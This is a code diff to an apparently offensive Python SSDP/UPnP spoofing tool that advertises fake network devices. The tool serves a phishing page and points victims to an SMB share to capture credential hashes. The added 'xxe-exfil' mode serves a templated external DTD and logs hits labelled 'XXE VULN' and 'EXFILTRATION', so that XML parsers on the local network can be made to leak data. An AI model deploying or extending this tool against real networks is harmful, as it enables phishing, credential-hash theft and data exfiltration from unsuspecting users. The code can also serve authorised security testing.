@@ -36,6 +36,8 @@ warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
 msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
 xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
 phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC 
+xxeBox = bcolors.RED +      '[XXE VULN!!!!] ' + bcolors.ENDC 
+exfilBox = bcolors.RED +    '[EXFILTRATION] ' + bcolors.ENDC 
 
 # Handle arguments before moving on....
 parser = argparse.ArgumentParser()
@@ -102,11 +104,15 @@ class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """
     pass
 
-def MakeHTTPClass(deviceXML, serviceXML, phishPage):
+def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
     """
     The class below is being built inside a function to allow us to easily pass variables to built-in functions.
     This will build a multi-threaded HTTP server listening for specific requests for the XML files we are serving.
-    Any requests to the HTTP server other than the two XML files below will be given the phishing page.
+
+    When used with the 'xxe' template, it will also notify on apps that have potential 0-day XXE vulnerabilities
+    in their XML parsing engines. If you see that warning, it may be CVE time!
+
+    Any requests to the HTTP server other than those defined will be given the phishing page.
 
     The phishing page the devices SHOULD be requesting is 'present.html' but we will serve it to all requests,
     in case a curious users sees the reference and browses there manually.
@@ -124,6 +130,16 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write(serviceXML.encode())
+            elif self.path == '/ssdp/xxe.html':
+                self.send_response(200)
+                self.send_header('Content-type', 'application/xml')
+                self.end_headers()
+                self.wfile.write('.'.encode())
+            elif self.path == '/ssdp/data.dtd':
+                self.send_response(200)
+                self.send_header('Content-type', 'application/xml')
+                self.end_headers()
+                self.wfile.write(exfilDTD.encode())
             else:
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
@@ -142,6 +158,15 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage):
             path = self.path
             if 'xml' in self.path:
                 print(xmlBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print("               {} {}".format(verb, path))
+            elif 'xxe.html' in self.path:
+                print(xxeBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print("               {} {}".format(verb, path))
+            elif 'data.dtd' in self.path:
+                print(xxeBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print("               {} {}".format(verb, path))
+            elif 'exfiltrated' in self.path:
+                print(exfilBox + "Host: {}, User-Agent: {}".format(address, headers))
                 print("               {} {}".format(verb, path))
             else:
                 print(phishBox + "Host: {}, User-Agent: {}".format(address, headers))
@@ -224,12 +249,13 @@ def send_location(listener, address, requestedST):
     reply = bytes(reply, 'utf-8')
     listener.sock.sendto(reply, address)
 
-def buildDeviceXML():
+def buildDeviceXML(smbServer):
     """
     Builds the device descriptor XML file.
     """
     variables = {'localIp': localIp,
-		 'localPort': localPort}
+		 'localPort': localPort,
+                 'smbServer': smbServer}
     fileIn = open(templateDir + '/device.xml')
     template = Template(fileIn.read())
     xmlFile = template.substitute(variables)
@@ -256,11 +282,25 @@ def buildPhish(smbServer):
     phishPage = template.substitute(variables)
     return phishPage
 
-def serve_html(deviceXML, serviceXML, phishPage):
+def buildExfil():
+    """
+    Builds the required page for data exfiltration when used with the xxe-exfil template.
+    """
+    if 'xxe-exfil' in templateDir:
+        variables = {'localIp': localIp,
+            	 'localPort': localPort}
+        fileIn = open(templateDir + '/data.dtd')
+        template = Template(fileIn.read())
+        exfilPage = template.substitute(variables)
+    else:
+        exfilPage = '.'
+    return exfilPage
+
+def serve_html(deviceXML, serviceXML, phishPage, exfilDTD):
     """
     Starts the web server for delivering XML files and the phishing page.
     """
-    HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage)
+    HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD)
     socketserver.TCPServer.allow_reuse_address = True
     descriptor = MultiThreadedHTTPServer((localIp, localPort), HTTPClass)
     descriptor.serve_forever()
@@ -268,11 +308,15 @@ def serve_html(deviceXML, serviceXML, phishPage):
 def print_details(smbServer):
     print("\n\n")
     print("########################################")
-    print(okBox + "MSEARCH LISTENER:   {}.".format(interface))
+    print(okBox + "EVIL TEMPLATE:      {}".format(templateDir))
+    print(okBox + "MSEARCH LISTENER:   {}".format(interface))
     print(okBox + "DEVICE DESCRIPTOR:  http://{}:{}/ssdp/device-desc.xml".format(localIp, localPort))
     print(okBox + "SERVICE DESCRIPTOR: http://{}:{}/ssdp/service-desc.xml".format(localIp, localPort))
     print(okBox + "PHISHING PAGE:      http://{}:{}/ssdp/present.html".format(localIp, localPort))
-    print(okBox + "SMB POINTER:        file://///{}/smb/hash.jpg".format(smbServer))
+    if 'xxe-exfil' in templateDir:
+        print(okBox + "EXFIL PAGE:         http://{}:{}/ssdp/data.dtd".format(localIp, localPort))
+    else:
+        print(okBox + "SMB POINTER:        file://///{}/smb/hash.jpg".format(smbServer))
     print("########################################")
     print("\n\n")
 
@@ -290,12 +334,13 @@ def main():
     global localIp
     localIp = get_ip()
     smbServer = set_smb()
-    deviceXML = buildDeviceXML()
+    deviceXML = buildDeviceXML(smbServer)
     serviceXML = buildServiceXML()
     phishPage = buildPhish(smbServer)
+    exfilDTD = buildExfil()
     print_details(smbServer)
     try:
-        webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage))
+        webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage, exfilDTD))
         ssdpServer = Process(target=listen_msearch, args=())
         webServer.start()
         ssdpServer.start()
